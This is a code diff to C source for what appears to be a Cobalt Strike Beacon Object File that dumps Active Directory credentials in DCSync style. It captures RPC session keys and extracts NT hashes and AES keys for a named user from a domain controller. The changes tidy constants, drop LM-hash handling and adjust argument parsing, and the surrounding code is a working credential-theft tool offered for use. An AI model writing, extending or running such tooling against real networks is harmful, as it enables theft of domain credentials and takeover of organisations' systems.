@@ -23,26 +23,13 @@ DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char* str1, const char* str2);
 DECLSPEC_IMPORT char* __cdecl MSVCRT$strcpy(char* dest, const char* src);
 DECLSPEC_IMPORT char* __cdecl MSVCRT$strchr(const char *str, int c);
 
-// Crypto constants
-#define CALG_MD5 0x00008003
-#define CALG_RC4 0x00006801
-#define CRYPT_VERIFYCONTEXT 0xF0000000
-#define HP_HASHVAL 0x0002
+// CUR_BLOB_VERSION not in system headers
+#ifndef CUR_BLOB_VERSION
 #define CUR_BLOB_VERSION 2
-#define RPC_C_AUTHZ_NAME 0x01
-#define RPC_S_OK 0
+#endif
 
-// WinCrypt BLOBHEADER
-typedef struct _BLOBHEADER {
-    BYTE bType;
-    BYTE bVersion;
-    WORD reserved;
-    ALG_ID aiKeyAlg;
-} BLOBHEADER;
-
-// InterlockedCompareExchange
+// InterlockedCompareExchange — call via KERNEL32$ directly in code
 DECLSPEC_IMPORT LONG WINAPI KERNEL32$InterlockedCompareExchange(volatile LONG* Destination, LONG Exchange, LONG Comparand);
-#define InterlockedCompareExchange KERNEL32$InterlockedCompareExchange
 
 // ============================================================================
 // Session Key Capture (RPC Security Callback)
@@ -53,7 +40,7 @@ static DWORD g_SessionKeyCopyLen = 0;
 static volatile LONG g_SessionKeyCapturing = 0;
 
 void RPC_ENTRY RpcSecurityCallback(void *Context) {
-    if (InterlockedCompareExchange(&g_SessionKeyCapturing, 1, 0) != 0) {
+    if (KERNEL32$InterlockedCompareExchange(&g_SessionKeyCapturing, 1, 0) != 0) {
         return;
     }
 
@@ -531,11 +518,9 @@ void ProcessCredentials(REPLENTINFLIST* objects, const char* samAccountName, con
     if (!objects) return;
 
     char ntHash[33] = {0};
-    char lmHash[33] = {0};
     char aes256Key[65] = {0};
     char aes128Key[33] = {0};
     BOOL foundNT = FALSE;
-    BOOL foundLM = FALSE;
     BOOL foundAES256 = FALSE;
     BOOL foundAES128 = FALSE;
     DWORD userRID = 0;
@@ -783,7 +768,7 @@ void go(char *args, int alen) {
     BeaconDataParse(&parser, args, alen);
 
     // Parse arguments per module.yaml: domain(z), user(z), dc(z), all(i)
-    char* domain = ValidateInput(BeaconDataExtract(&parser, NULL));
+    (void)ValidateInput(BeaconDataExtract(&parser, NULL)); // domain (positional, unused — DC auto-discovers)
     char* user = ValidateInput(BeaconDataExtract(&parser, NULL));
     char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
     int dumpAll = BeaconDataInt(&parser);
